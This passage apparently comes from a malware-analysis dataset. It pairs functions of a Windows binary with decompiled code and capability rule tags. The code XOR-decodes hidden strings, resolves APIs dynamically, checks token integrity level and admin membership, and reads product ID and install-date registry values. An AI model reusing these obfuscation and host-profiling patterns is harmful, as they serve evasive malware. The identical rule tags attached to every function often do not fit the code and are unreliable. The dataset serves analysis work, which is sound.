(*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x4383d0, uVar2);\n    }\n    if (*0x4383d0 == 0) {\n        uVar2 = fcn.00401270();\n        *0x4383d0 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar2);\n    }\n    if (*0x4383cc == NULL) {\n        var_98h._0_1_ = 0x2e;\n        var_98h._1_1_ = 0x43;\n        var_98h._2_1_ = 5;\n        var_98h._3_1_ = 7;\n        var_94h = 0x26;\n        var_93h = 0x42;\n        var_92h = 0;\n        var_91h = 3;\n        var_90h = 0x1d;\n        var_8fh = 0x34;\n        var_8eh = 6;\n        var_8dh = 0x4d;\n        var_8ch = 0x1b;\n        var_8bh = 6;\n        var_8ah = 0x37;\n        var_89h = 0x1b;\n        var_88h = 0x46;\n        var_87h = 0x3f;\n        var_86h = 9;\n        var_85h = 0x25;\n        var_84h = 0x1d;\n        var_83h = 0x5b;\n        var_82h = 0x3c;\n        var_81h = 0x38;\n        var_80h = 0x23;\n        var_7fh = 0x1b;\n        var_7eh = 0x57;\n        var_7dh = 0x37;\n        var_7ch = 0x1b;\n        var_7bh = 0x22;\n        var_7ah = 0x42;\n        var_79h = 0;\n        var_78h = 0x52;\n        var_44h[0] = 0x74;\n        var_44h[1] = 0x34;\n        var_44h[2] = 0x52;\n        var_44h[3] = 0x68;\n        var_40h = 0x51;\n        fcn.004012a0(0x21);\n        for (var_20h = 0; var_20h < 0x21; var_20h = var_20h + 1) {\n            fcn.00401280(var_20h, *(&var_98h + var_20h) ^ var_44h[var_20h % 5]);\n        }\n        uVar2 = fcn.00401270();\n        *0x4383cc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x4383d0, uVar2);\n        fcn.004012d0();\n    }\n    fcn.0041c600(*0x436b48, 0);\n    if ((*0x4383cc != NULL) && (var_b4h = (**0x4383cc)(arg_8h, 0, &var_f0h, 0x30, &var_ch),  -1 < var_b4h)) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (var_10h != NULL) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x100);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (((var_4h != 0) && (var_ch = fcn.0041b8e0(arg_8h, &var_e8h, var_4h, 0x28),  var_ch != 0)) &&\n               (var_ch = fcn.0041b8e0(arg_8h, var_4h + 0x18, var_4h + 0x28, 0x40),  var_ch != 0)) {\n                var_c0h = *(var_4h + 0x18) + 0x10;\n                var_bch = *(var_4h + 0x1c) + (0xffffffef < *(var_4h + 0x18));\n                var_ach = *(var_4h + 0x38);\n                var_a8h = *(var_4h + 0x3c);\n                var_14h = 4;\n                var_8h = arg_ch + 2;\n                while (((var_ach != var_c0h || (var_a8h != var_bch)) &&\n                       (var_ch = fcn.0041b8e0(arg_8h, &var_ach, var_4h + 0x68, 0x98),  var_ch != 0))) {\n                    var_ach = *(var_4h + 0x68);\n                    var_a8h = *(var_4h + 0x6c);\n                    var_14h = var_14h + 0x120;\n                    if (var_14h <= arg_10h) {\n                        var_a0h = *(var_4h + 0xb0) / 2;\n                        *(var_8h + 6) = var_28h;\n                        var_8h[5] = *(var_4h + 0xd0);\n                        *(var_8h + 7) = *(var_4h + 0xd4);\n                        var_8h[4] = *(var_4h + 0xa8);\n                        var_8h[2] = *(var_4h + 0x98);\n                        var_8h[3] = *(var_4h + 0x9c);\n                        puVar4 = var_10h;\n                        for (iVar3 = 0x200; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *puVar4 = 0;\n                            puVar4 = puVar4 + 1;\n                        }\n                        if ((var_a0h < 0x100) &&\n                           (var_ch = fcn.0041b8e0(arg_8h, var_4h + 0xb8, var_10h, *(var_4h + 0xb0)),  var_ch != 0)) {\n                            for (var_24h = 0; var_24h < var_a0h; var_24h = var_24h + 1) {\n                                *(var_8h + var_24h + 0x20) = var_10h[var_24h * 2];\n                            }\n                            *(var_8h + var_a0h + 0x20) = 0;\n                            iVar1 = fcn.0041b230(var_8h + 8, 0x5c);\n                            *(var_8h + 0x1e) = (iVar1 - (var_8h + 0x20)) + 1;\n                        }\n                        var_8h = var_8h + 0x48;\n                        var_28h = var_28h + 1;\n                    }\n                }\n                if (arg_ch != NULL) {\n                    *arg_ch = var_28h;\n                }\n            }\n        }\n    }\n    if (var_10h != NULL) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    if (var_4h != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    if (arg_14h != NULL) {\n        *arg_14h = var_14h;\n    }\n    if ((var_14h <= arg_10h) && (var_14h != 0)) {\n        var_b0h = 1;\n    }\n    var_b8h = var_b0h;\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_b8h;\n}\n",
        "token_count": 3682
    },
    "0041daa0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.0041daa0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t lpAddress;\n    \n    _var_2ch = 0;\n    lpAddress = 0;\n    iVar1 = fcn.0041c2b0(arg_8h, arg_ch, &var_24h, &var_8h);\n    if ((iVar1 == 0) && (lpAddress = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_8h, 0x3000, 4),  lpAddress != 0)) {\n        var_1ch = var_24h;\n        var_18h = var_20h;\n        var_ch = lpAddress;\n        do {\n            var_14h = fcn.0041b8e0(arg_8h, &var_1ch, var_ch, 0x1000);\n            var_8h = var_8h + -0x1000;\n            var_ch = var_ch + 0x1000;\n            bVar2 = 0xffffefff < var_1ch;\n            var_1ch = var_1ch + 0x1000;\n            var_18h = var_18h + bVar2;\n        } while (var_8h != 0);\n        var_10h = fcn.0041b470(lpAddress, arg_10h, 0);\n        if (var_10h != NULL) {\n            _var_2ch = CONCAT44(var_20h + CARRY4(*var_10h, var_24h), *var_10h + var_24h);\n        }\n    }\n    if (lpAddress != 0) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n    }\n    return _var_2ch;\n}\n",
        "token_count": 524
    },
    "0041dbb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.0041dbb0(void)\n\n{\n    bool bVar1;\n    \n    *0x436b88 = (*_sym.imp.USER32.dll_GetShellWindow)();\n    bVar1 = *0x436b88 != 0;\n    if (bVar1) {\n        (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(*0x436b88, 0x436b5c);\n    }\n    return bVar1;\n}\n",
        "token_count": 99
    },
    "0041dbf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0041dbf0(void)\n\n{\n    uint var_14h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = 0xc;\n    var_4h = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &var_14h, &var_8h);\n    if (var_4h != 0) {\n        (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, &var_14h, &var_4h);\n    }\n    return var_4h;\n}\n",
        "token_count": 147
    },
    "0041dc40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0041dc40(uint ProcessHandle)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t *puVar3;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint TokenHandle;\n    uint8_t *nSubAuthority;\n    uint TokenInformationLength;\n    uint var_6ch;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uint var_54h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uint8_t var_40h [4];\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uint var_28h;\n    uchar var_24h;\n    uchar var_23h;\n    uint8_t var_20h [4];\n    uchar var_1ch;\n    uint32_t var_18h;\n    uint *TokenInformation;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x7a)) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            TokenInformation = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (TokenInformation != NULL) {\n                var_6ch._0_1_ = 0x30;\n                var_6ch._1_1_ = 0x21;\n                var_6ch._2_1_ = 0x5f;\n                var_6ch._3_1_ = 0x29;\n                var_68h = 0x26;\n                var_67h = 0x10;\n                var_66h = 0;\n                var_65h = 0x35;\n                var_64h = 0x42;\n                var_63h = 0x28;\n                var_62h = 0x36;\n                var_61h = 7;\n                var_60h = 0x14;\n                var_5fh = 0x21;\n                var_5eh = 0x53;\n                var_5dh = 0x23;\n                var_5ch = 0x11;\n                var_5bh = 0xb;\n                var_5ah = 4;\n                var_59h = 0x38;\n                var_58h = 0x36;\n                var_28h._0_1_ = 0x65;\n                var_28h._1_1_ = 0x54;\n                var_28h._2_1_ = 0x36;\n                var_28h._3_1_ = 0x4d;\n                var_24h = 0x65;\n                var_23h = 0x62;\n                fcn.004012a0(0x15);\n                for (var_8h = 0; var_8h < 0x15; var_8h = var_8h + 1) {\n                    fcn.00401280(var_8h, *(&var_6ch + var_8h) ^ *(&var_28h + var_8h % 6));\n                }\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, TokenInformation, TokenInformationLength, &TokenInformationLength)\n                ;\n                if (iVar1 != 0) {\n                    var_54h._0_1_ = 0x34;\n                    var_54h._1_1_ = 0x4a;\n                    var_54h._2_1_ = 0x42;\n                    var_54h._3_1_ = 0x1f;\n                    var_50h = 0x24;\n                    var_4fh = 0x5e;\n                    var_4eh = 0x21;\n                    var_4dh = 0x46;\n                    var_4ch = 0x5f;\n                    var_4bh = 8;\n                    var_4ah = 0x35;\n                    var_49h = 0x5a;\n                    var_48h = 8;\n                    var_47h = 0x5d;\n                    var_46h = 1;\n                    var_45h = 0x58;\n                    var_44h = 0x77;\n                    var_43h = 0x33;\n                    var_30h._0_1_ = 0x67;\n                    var_30h._1_1_ = 0x33;\n                    var_30h._2_1_ = 0x31;\n                    var_30h._3_1_ = 0x6b;\n                    var_2ch = 0x41;\n                    var_2bh = 0x33;\n                    fcn.004012a0(0x12);\n                    for (var_ch = 0; var_ch < 0x12; var_ch = var_ch + 1) {\n                        fcn.00401280(var_ch, *(&var_54h + var_ch) ^ *(&var_30h + var_ch % 6));\n                    }\n                    nSubAuthority = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*TokenInformation);\n                    if ((nSubAuthority != NULL) && (*nSubAuthority != 0)) {\n                        var_40h[0] = 0x27;\n                        var_40h[1] = 0x24;\n                        var_40h[2] = 0x26;\n                        var_40h[3] = 4;\n                        var_3ch = 0x3f;\n                        var_3bh = 0x18;\n                        var_3ah = 0x20;\n                        var_39h = 0x3f;\n                        var_38h = 0x33;\n                        var_37h = 0x35;\n                        var_36h = 0x36;\n                        var_35h = 0x22;\n                        var_34h = 0x29;\n                        var_33h = 0x74;\n                        var_32h = 0x62;\n                        var_31h = 0x75;\n                        var_20h[0] = 0x75;\n                        var_20h[1] = 0x50;\n                        var_20h[2] = 0x4a;\n                        var_20h[3] = 0x47;\n                        var_1ch = 0x50;\n                        fcn.004012a0(0x10);\n                        for (var_10h = 0; var_10h < 0x10; var_10h = var_10h + 1) {\n                            fcn.00401280(var_10h, var_40h[var_10h] ^ var_20h[var_10h % 5]);\n                        }\n                        puVar3 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*TokenInformation, *nSubAuthority - 1);\n                        if (puVar3 != NULL) {\n                            var_18h = *puVar3;\n                            if (var_18h < 0x2000) {\n                                var_1h._0_1_ = 1;\n                            }\n                            else if ((var_18h < 0x2000) || (0x2fff < var_18h)) {\n                                if (0x2fff < var_18h) {\n                                    var_1h._0_1_ = 3;\n                                }\n                            }\n                            else {\n                                var_1h._0_1_ = 2;\n                            }\n                        }\n                        fcn.004012d0();\n                    }\n                    fcn.004012d0();\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, TokenInformation);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                fcn.004012d0();\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return var_1h;\n}\n",
        "token_count": 2220
    },
    "0041dfc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041dfc0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x436b68 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, *0x436b68);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    if (*0x436b44 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, *0x436b44);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    if (*0x436b58 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x436b58);\n    }\n    return;\n}\n",
        "token_count": 173
    },
    "0041e020": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041e020(void)\n\n{\n    uint uVar1;\n    uint var_4ch;\n    uint var_28h;\n    uchar var_24h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uchar var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uchar var_1ch;\n    uchar var_1bh;\n    uchar var_1ah;\n    uchar var_19h;\n    uchar var_18h;\n    uchar var_17h;\n    uchar var_16h;\n    uchar var_15h;\n    uint lpModuleName;\n    uchar var_10h;\n    uchar var_fh;\n    uchar var_eh;\n    uchar var_dh;\n    uchar var_ch;\n    uchar var_bh;\n    uchar var_ah;\n    uchar var_9h;\n    uchar var_8h;\n    code *var_4h;\n    \n    lpModuleName._0_1_ = 0x6b;\n    lpModuleName._1_1_ = 0x65;\n    lpModuleName._2_1_ = 0x72;\n    lpModuleName._3_1_ = 0x6e;\n    var_10h = 0x65;\n    var_fh = 0x6c;\n    var_eh = 0x33;\n    var_dh = 0x32;\n    var_ch = 0x2e;\n    var_bh = 100;\n    var_ah = 0x6c;\n    var_9h = 0x6c;\n    var_8h = 0;\n    var_28h._0_1_ = 0x47;\n    var_28h._1_1_ = 0x65;\n    var_28h._2_1_ = 0x74;\n    var_28h._3_1_ = 0x4e;\n    var_24h = 0x61;\n    var_23h = 0x74;\n    var_22h = 0x69;\n    var_21h = 0x76;\n    var_20h = 0x65;\n    var_1fh = 0x53;\n    var_1eh = 0x79;\n    var_1dh = 0x73;\n    var_1ch = 0x74;\n    var_1bh = 0x65;\n    var_1ah = 0x6d;\n    var_19h = 0x49;\n    var_18h = 0x6e;\n    var_17h = 0x66;\n    var_16h = 0x6f;\n    var_15h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_28h);\n    var_4h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (var_4h != NULL) {\n        (*var_4h)(&var_4ch);\n        if (var_4ch == 9) {\n            *0x436b50 = 1;\n            *0x436104 = 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 726
    },
    "0041e0f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e0f0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    int32_t ProcessHandle;\n    \n    ProcessHandle = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    if (ProcessHandle == 0) {\n        var_ch = 0x80004005;\n    }\n    else {\n        TokenHandle = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 8, &TokenHandle);\n        if (iVar1 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n            var_ch = 0x80004005;\n        }\n        else {\n            iVar1 = fcn.0041ecf0(TokenHandle, arg_8h, arg_ch);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n            if (iVar1 == 0) {\n                var_ch = 0x80004005;\n            }\n            else {\n                var_ch = 0;\n            }\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 271
    },
    "0041e1c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041e1c0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_64h;\n    int32_t var_10h_2;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_64h_2;\n    uint var_5ch_2;\n    uint var_58h_2;\n    uint var_54h_2;\n    uint var_50h_2;\n    uint var_4ch_2;\n    uint var_48h_2;\n    uint var_44h_2;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_38h_2;\n    uint var_34h_2;\n    uint var_30h_2;\n    uint var_2ch_2;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_1ch_2;\n    uint var_18h_2;\n    uint var_14h_2;\n    uint var_10h_3;\n    uint var_ch_2;\n    uint var_8h_2;\n    uint var_4h_2;\n    \n    return 0x2b;\n}\n",
        "token_count": 623
    },
    "0041e3e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e3e0(int32_t lpString, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t lpString_00;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (lpString != 0) {\n        if (arg_ch == -1) {\n            arg_ch = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, arg_ch + 1);\n        lpString_00 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (lpString_00 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, lpString, arg_ch, lpString_00, arg_ch + 1, 0, 0);\n            if (iVar2 != 0) {\n                var_8h = fcn.0041e850(lpString_00, arg_ch);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString_00);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            }\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 305
    },
    "0041e480": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041e480(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint name;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uint lpValueName;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uint var_3ch;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uint32_t var_28h;\n    uchar *lpString;\n    uint32_t var_20h;\n    uchar *var_1ch;\n    uint lpBuffer;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint hKey;\n    uint nSize;\n    \n    puVar3 = 0x436b70;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    name._0_1_ = 0x53;\n    name._1_1_ = 0x4f;\n    name._2_1_ = 0x46;\n    name._3_1_ = 0x54;\n    var_7ch = 0x57;\n    var_7bh = 0x41;\n    var_7ah = 0x52;\n    var_79h = 0x45;\n    var_78h = 0x5c;\n    var_77h = 0x4d;\n    var_76h = 0x69;\n    var_75h = 99;\n    var_74h = 0x72;\n    var_73h = 0x6f;\n    var_72h = 0x73;\n    var_71h = 0x6f;\n    var_70h = 0x66;\n    var_6fh = 0x74;\n    var_6eh = 0x5c;\n    var_6dh = 0x57;\n    var_6ch = 0x69;\n    var_6bh = 0x6e;\n    var_6ah = 100;\n    var_69h = 0x6f;\n    var_68h = 0x77;\n    var_67h = 0x73;\n    var_66h = 0x20;\n    var_65h = 0x4e;\n    var_64h = 0x54;\n    var_63h = 0x5c;\n    var_62h = 0x43;\n    var_61h = 0x75;\n    var_60h = 0x72;\n    var_5fh = 0x72;\n    var_5eh = 0x65;\n    var_5dh = 0x6e;\n    var_5ch = 0x74;\n    var_5bh = 0x56;\n    var_5ah = 0x65;\n    var_59h = 0x72;\n    var_58h = 0x73;\n    var_57h = 0x69;\n    var_56h = 0x6f;\n    var_55h = 0x6e;\n    var_54h = 0;\n    lpValueName._0_1_ = 0x44;\n    lpValueName._1_1_ = 0x69;\n    lpValueName._2_1_ = 0x67;\n    lpValueName._3_1_ = 0x69;\n    var_4ch = 0x74;\n    var_4bh = 0x61;\n    var_4ah = 0x6c;\n    var_49h = 0x50;\n    var_48h = 0x72;\n    var_47h = 0x6f;\n    var_46h = 100;\n    var_45h = 0x75;\n    var_44h = 99;\n    var_43h = 0x74;\n    var_42h = 0x49;\n    var_41h = 100;\n    var_40h = 0;\n    var_3ch._0_1_ = 0x49;\n    var_3ch._1_1_ = 0x6e;\n    var_3ch._2_1_ = 0x73;\n    var_3ch._3_1_ = 0x74;\n    var_38h = 0x61;\n    var_37h = 0x6c;\n    var_36h = 0x6c;\n    var_35h = 0x44;\n    var_34h = 0x61;\n    var_33h = 0x74;\n    var_32h = 0x65;\n    var_31h = 0;\n    var_30h = 0x52;\n    var_2fh = 0x65;\n    var_2eh = 0x67;\n    var_2dh = 0x49;\n    var_2ch = 100;\n    var_2bh = 0;\n    nSize = 0;\n    var_10h = 0;\n    var_14h = 0;\n    hKey = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar2 == 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        puVar3 = var_1ch;\n        for (iVar2 = 100; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0x30;\n            puVar3 = puVar3 + 1;\n        }\n        nSize = 200;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &lpValueName, 0, 0, var_1ch, &nSize);\n        if (iVar2 != 0) {\n            var_10h = var_10h + 1;\n        }\n        nSize = 4;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, &var_14h, &nSize);\n        if (iVar2 != 0) {\n            var_10h = var_10h + 1;\n        }\n        if (0 < var_10h) {\n            var_ch = 0;\n            nSize = 4;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_30h, 0, 0, &var_ch, &nSize);\n            if (iVar2 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, 